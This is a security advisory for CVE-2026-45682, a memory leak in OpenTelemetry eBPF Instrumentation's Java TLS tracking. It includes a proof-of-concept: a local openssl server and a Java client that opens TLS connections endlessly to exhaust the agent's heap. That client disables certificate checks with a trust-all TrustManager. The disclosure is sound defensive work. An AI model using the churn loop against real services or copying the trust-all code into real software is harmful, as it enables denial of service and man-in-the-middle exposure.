# [M] OpenTelemetry eBPF Instrumentation: CappedConcurrentHashMap leaks keys after removals

## Summary
Severity: Medium
Advisory: GHSA-962q-hwm5-52x5
CVE: CVE-2026-45682
CWE: CWE-401, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-962q-hwm5-52x5
Type: github-advisory

## Affected
- Go: `go.opentelemetry.io/obi` — affected >=0 <0.9.0

## Details
### Summary

The custom `CappedConcurrentHashMap` introduced for Java TLS state tracking never removes keys from its insertion-order queue when entries are deleted. In long-running instrumented JVMs, repeated connection churn can therefore grow the queue without bound and exhaust heap memory.

### Details

The vulnerable implementation is in [pkg/internal/java/agent/src/main/java/io/opentelemetry/obi/java/instrumentations/util/CappedConcurrentHashMap.java#L11](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/360521f411213566a3b557a1f0c093e6cd68a4de/pkg/internal/java/agent/src/main/java/io/opentelemetry/obi/java/instrumentations/util/CappedConcurrentHashMap.java#L11). New keys are appended to a `ConcurrentLinkedQueue`, and eviction only runs inside `put()` when `map.size() > capacity`.

The `remove()` method removes the key from the `ConcurrentHashMap` but leaves the key in the queue. Because `evictIfNeeded()` only checks `map.size() > capacity`, the queue can grow forever in workloads that insert and remove keys while keeping the live map below the cap.

This pattern is reachable from [pkg/internal/java/agent/src/main/java/io/opentelemetry/obi/java/instrumentations/data/SSLStorage.java#L66](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/360521f411213566a3b557a1f0c093e6cd68a4de/pkg/internal/java/agent/src/main/java/io/opentelemetry/obi/java/instrumentations/data/SSLStorage.java#L66), where `cleanupConnectionBufMapping` removes entries from `bufConn` and `activeConnections`, and `removeBufferMapping` removes entries from `bufToBuf`. In normal TLS connection lifecycles, those removals happen frequently.

### PoC

Local testing with a small Java reproducer showed queue growth continuing after removals and eventually reached `OutOfMemoryError`, which matches the code-level leak mechanism described above.

Use a vulnerable Java agent build from `v0.0.0-rc.2+build.2` or any later release that still contains the change. Start any JVM process instrumented with OBI's Java TLS support, then generate a large number of short-lived TLS handshakes.

One local reproducer is:

```bash
git checkout v0.0.0-rc.2+build.2
make build
```

Start a simple TLS server:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/key.pem -out /tmp/cert.pem -subj '/CN=localhost' -days 1
openssl s_server -accept 9443 -key /tmp/key.pem -cert /tmp/cert.pem -quiet
```

Run an instrumented JVM client that repeatedly opens and closes TLS connections:

```java
// save as /tmp/TLSChurn.java
import javax.net.ssl.*;
import java.net.Socket;

public class TLSChurn {
  public static void main(String[] args) throws Exception {
    SSLContext ctx = SSLContext.getInstance("TLS");
    ctx.init(null, new TrustManager[]{new X509TrustManager() {
      public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
      public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
      public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
    }}, new java.security.SecureRandom());

    SSLSocketFactory f = ctx.getSocketFactory();
    for (;;) {
      try (Socket s = f.createSocket("127.0.0.1", 9443)) {
        s.getOutputStream().write("x".getBytes());
      } catch (Exception ignored) {}
    }
  }
}
```

Compile and run:

```bash
javac /tmp/TLSChurn.java
java TLSChurn
```

Attach the vulnerable OBI Java instrumentation to the JVM. Over time, heap usage in the OBI Java agent process grows even though live connection counts remain bounded. A heap dump will show large retention from `ConcurrentLinkedQueue` nodes owned by `CappedConcurrentHashMap`.

### Impact

This issue causes an availability loss in instrumented Java workloads that use OBI's TLS instrumentation. Repeated connection setup and teardown can grow the retained queue until the Java helper experiences long GC pauses or exhausts heap memory with `OutOfMemoryError`.

## References
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/security/advisories/GHSA-962q-hwm5-52x5
- https://nvd.nist.gov/vuln/detail/CVE-2026-45682
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/releases/tag/v0.9.0
